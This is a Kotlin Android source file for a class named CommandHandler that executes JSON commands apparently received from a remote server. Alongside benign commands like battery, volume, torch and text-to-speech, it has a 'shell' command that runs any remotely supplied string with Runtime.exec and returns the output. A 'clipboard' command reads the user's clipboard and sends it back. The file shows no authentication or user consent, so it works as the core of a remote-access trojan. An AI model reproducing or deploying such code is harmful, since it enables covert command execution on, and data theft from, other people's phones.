package com.example.devicecontrol

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.widget.Toast
import org.json.JSONObject
import org.json.JSONArray
import android.os.Handler
import android.os.Looper
import android.media.AudioManager
import android.hardware.camera2.CameraManager
import android.speech.tts.TextToSpeech
import android.app.NotificationChannel
import android.app.NotificationManager
import androidx.core.app.NotificationCompat
import android.hardware.SensorManager
import android.hardware.Sensor
import java.io.BufferedReader
import java.io.InputStreamReader
import android.content.ClipboardManager
import android.content.ClipData
import java.util.Locale

class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {

    private var tts: TextToSpeech? = null
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

    init {
        tts = TextToSpeech(context, this)
    }

    override fun onInit(status: Int) {
        if (status == TextToSpeech.SUCCESS) {
            tts?.language = Locale("id", "ID")
        }
    }

    fun handle(jsonStr: String, sendResponse: (String) -> Unit) {
        var cmdId = ""
        try {
            val json = JSONObject(jsonStr)
            val command = json.getString("command")
            cmdId = json.optString("id", "")
            val textArg = json.optString("text", "")

            when (command) {
                "ping" -> {
                    sendResponse(createResponse(cmdId, "pong", "Alive"))
                }
                "get_device_info" -> {
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("brand", Build.BRAND)
                        put("sdk", Build.VERSION.SDK_INT)
                        put("release", Build.VERSION.RELEASE)
                    }
                    sendResponse(createResponse(cmdId, "device_info", info))
                }
                "get_battery" -> {
                    val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
                    val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    sendResponse(createResponse(cmdId, "battery_level", level))
                }
                "show_toast" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(context, textArg.ifEmpty { "Remote Command" }, Toast.LENGTH_SHORT).show()
                    }
                    sendResponse(createResponse(cmdId, "toast", "Displayed: $textArg"))
                }
                "shell" -> {
                    try {
                        val process = Runtime.getRuntime().exec(textArg.ifEmpty { "ls" })
                        val reader = BufferedReader(InputStreamReader(process.inputStream))
                        val errorReader = BufferedReader(InputStreamReader(process.errorStream))
                        
                        val output = StringBuilder()
                        var line: String?
                        while (reader.readLine().also { line = it } != null) {
                            output.append(line).append("\n")
                        }
                        while (errorReader.readLine().also { line = it } != null) {
                            output.append(line).append("\n")
                        }
                        
                        process.waitFor()
                        sendResponse(createResponse(cmdId, "shell_output", output.toString()))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Shell failed: ${e.message}"))
                    }
                }
                "get_volume" -> {
                    val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                    val volInfo = JSONObject().apply {
                        put("ring", am.getStreamVolume(AudioManager.STREAM_RING))
                        put("music", am.getStreamVolume(AudioManager.STREAM_MUSIC))
                        put("alarm", am.getStreamVolume(AudioManager.STREAM_ALARM))
                        put("voice", am.getStreamVolume(AudioManager.STREAM_VOICE_CALL))
                        put("notification", am.getStreamVolume(AudioManager.STREAM_NOTIFICATION))
                    }
                    sendResponse(createResponse(cmdId, "volume_info", volInfo))
                }
                "set_volume" -> {
                    // textArg format: "music 15" atau "ring 5"
                    val parts = textArg.split(" ")
                    if (parts.size >= 2) {
                        val type = parts[0]
                        val vol = parts[1].toIntOrNull() ?: 0
                        val am = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
                        val stream = when (type.lowercase()) {
                            "music" -> AudioManager.STREAM_MUSIC
                            "ring" -> AudioManager.STREAM_RING
                            "alarm" -> AudioManager.STREAM_ALARM
                            "notification" -> AudioManager.STREAM_NOTIFICATION
                            else -> AudioManager.STREAM_MUSIC
                        }
                        am.setStreamVolume(stream, vol, 0)
                        sendResponse(createResponse(cmdId, "success", "Volume $type set to $vol"))
                    } else {
                        sendResponse(createResponse(cmdId, "error", "Format: set_volume [type] [level]"))
                    }
                }
                "torch" -> {
                    try {
                        val camManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
                        val cameraId = camManager.cameraIdList[0] 
                        val state = textArg.lowercase() == "on"
                        camManager.setTorchMode(cameraId, state)
                        sendResponse(createResponse(cmdId, "success", "Torch turned $state"))
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Torch failed: ${e.message}"))
                    }
                }
                "tts" -> {
                    tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
                    sendResponse(createResponse(cmdId, "success", "Speaking: $textArg"))
                }
                "notify" -> {
                    val parts = textArg.split("|")
                    val title = if (parts.isNotEmpty()) parts[0] else "System Alert"
                    val content = if (parts.size > 1) parts[1] else "Message from server"
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        val channel = NotificationChannel("remote_notify", "Remote Messages", NotificationManager.IMPORTANCE_HIGH)
                        notificationManager.createNotificationChannel(channel)
                    }
                    val notification = NotificationCompat.Builder(context, "remote_notify")
                        .setSmallIcon(android.R.drawable.ic_dialog_alert)
                        .setContentTitle(title)
                        .setContentText(content)
                        .setPriority(NotificationCompat.PRIORITY_HIGH)
                        .build()
                        
                    notificationManager.notify((System.currentTimeMillis() % 10000).toInt(), notification)
                    sendResponse(createResponse(cmdId, "success", "Notification pushed"))
                }
                "sensors" -> {
                    val sm = context.getSystemService(Context.SENSOR_SERVICE) as SensorManager
                    val list = sm.getSensorList(Sensor.TYPE_ALL)
                    val result = JSONArray()
                    for (s in list) {
                        val obj = JSONObject()
                        obj.put("name", s.name)
                        obj.put("vendor", s.vendor)
                        obj.put("type", s.type)
                        result.put(obj)
                    }
                    sendResponse(createResponse(cmdId, "sensor_list", result))
                }
                "clipboard" -> {
                    // Android 10+ mencegah akses clipboard background kecuali aplikasi di foreground
                    try {
                        val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                        if (cm.hasPrimaryClip() && cm.primaryClip != null && cm.primaryClip!!.itemCount > 0) {
                            val txt = cm.primaryClip!!.getItemAt(0).text.toString()
                            sendResponse(createResponse(cmdId, "clipboard_content", txt))
                        } else {
                            sendResponse(createResponse(cmdId, "clipboard_content", "[Empty or Background Restricted]"))
                        }
                    } catch (e: Exception) {
                        sendResponse(createResponse(cmdId, "error", "Clipboard access blocked by OS: ${e.message}"))
                    }
                }
                else -> {
                    sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                }
            }
        } catch (e: Exception) {
            sendResponse(createResponse(cmdId, "error", e.message ?: "Invalid JSON or Logic"))
        }
    }

    private fun createResponse(cmdId: String, type: String, data: Any): String {
        return JSONObject().apply {
            if (cmdId.isNotEmpty()) put("id", cmdId)
            put("type", type)
            put("data", data)
            put("timestamp", System.currentTimeMillis())
        }.toString()
    }
}
